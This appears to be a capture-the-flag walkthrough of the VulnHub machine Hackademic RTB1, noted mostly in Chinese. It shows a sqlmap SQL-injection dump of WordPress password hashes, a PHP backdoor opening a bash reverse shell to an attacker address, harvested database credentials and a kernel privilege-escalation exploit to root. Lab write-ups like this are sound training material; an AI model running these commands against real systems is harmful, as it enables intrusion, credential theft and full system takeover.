# Hackademic: RTB1

2024-6-4 https://www.vulnhub.com/entry/hackademic-rtb1,17/

difficulty: easy

## IP

192.168.5.30

## Scan

Open Port -> 22,80

```
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
|_http-title: Hackademic.RTB1
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.15 (Fedora)
```

80 web 访问时，跳转到 http://funbox.fritz.box/，先将 funbox.fritz.box 添加到 /etc/hosts 中。

http://funbox.fritz.box/ 访问后，里面有个 target 链接，底部有一个 Uncategorized 链接，http://funbox.fritz.box/Hackademic_RTB1/?cat=1 在 1 后面加'，出现了 sql 报错，证明存在 sql 注入，使用 sqlmap 将数据 dump 出来：

```
WordPress database error: [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\\\' LIMIT 1' at line 1]
SELECT * FROM wp_categories WHERE cat_ID = 1\\\' LIMIT 1

sqlmap -u 'http://funbox.fritz.box/Hackademic_RTB1/?cat=1' --level 3 --batch --dbs

available databases [3]:
[*] information_schema
[*] mysql
[*] wordpress

sqlmap -u 'http://funbox.fritz.box/Hackademic_RTB1/?cat=1' --level 3 --batch -D wordpress -T wp_users -C user_nickname,user_pass --dump

+---------------+---------------------------------------------+
| user_nickname | user_pass                                   |
+---------------+---------------------------------------------+
| NickJames     | 21232f297a57a5a743894a0e4a801fc3 (admin)    |
| MaxBucky      | 50484c19f1afdaf3841a0d821ed393d2 (kernel)   |
| GeorgeMiller  | 7cbb3252ba6b7e9c422fac5334d22054 (q1w2e3)   |
| JasonKonnors  | 8601f6e1028a8e8a966f6c33fcd9aec4 (maxwell)  |
| TonyBlack     | a6e514f9486b83cb53d8d932f9a04292 (napoleon) |
| JohnSmith     | b986448f0bb9e5e124ca91d3d650f52c            |
+---------------+---------------------------------------------+
```

尝试用这几个得到的用户凭据，ssh 登陆，但是没有成功。

再看主页上，显示的是 wordpress ,直接找登陆入口:

```
http://funbox.fritz.box/Hackademic_RTB1/wp-login.php
```

使用 GeorgeMiller:q1w2e3 登陆后，发现是 admin 权限，其他用户都没有修改页面的权限。

直接在 http://funbox.fritz.box/Hackademic_RTB1/wp-admin/plugin-editor.php?file=markdown.php&a=te 中写入我们的后门一句话：

```
system("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1'");
```

kali 上监听 8888 端口，访问后门 php 页面，触发反弹 shell:

```
curl http://funbox.fritz.box/Hackademic_RTB1/wp-content/plugins/markdown.php
```

得到了反弹的 shell，开始进行系统枚举。

发现数据库连接配置信息：

```
bash-4.0$ cat wp-config.php

define('DB_NAME', 'wordpress');     // The name of the database
define('DB_USER', 'root');     // Your MySQL username
define('DB_PASSWORD', 'lz5yedns'); // ...and password
define('DB_HOST', 'localhost');     // 99% chance you won't need to change this value
```

/home 目录下，发现用户 p0wnbox.Team ，尝试用上面的密码切换到 p0wn 用户，没有成功，其他路径也没发现可以利用的点。

内核版本较低，可以进行提权。

Linux Kernel 2.6.36-rc8 - 'RDS Protocol' Local Privilege Escalation | linux/local/15285.c

```
bash-4.0$ gcc 15285.c -o 15285
bash-4.0$ ./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc0aa19ac
 [+] Resolved default_security_ops to 0xc0955c6c
 [+] Resolved cap_ptrace_traceme to 0xc055d9d7
 [+] Resolved commit_creds to 0xc044e5f1
 [+] Resolved prepare_kernel_cred to 0xc044e452
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
sh-4.0# id
uid=0(root) gid=0(root)

sh-4.0# cat /root/key.txt
Yeah!!
You must be proud because you 've got the password to complete the First *Realistic* Hackademic Challenge (Hackademic.RTB1) :)

$_d&jgQ>>ak\#b"(Hx"o<la_%

Regards,
mr.pr0n || p0wnbox.Team || 2011
http://p0wnbox.com
```
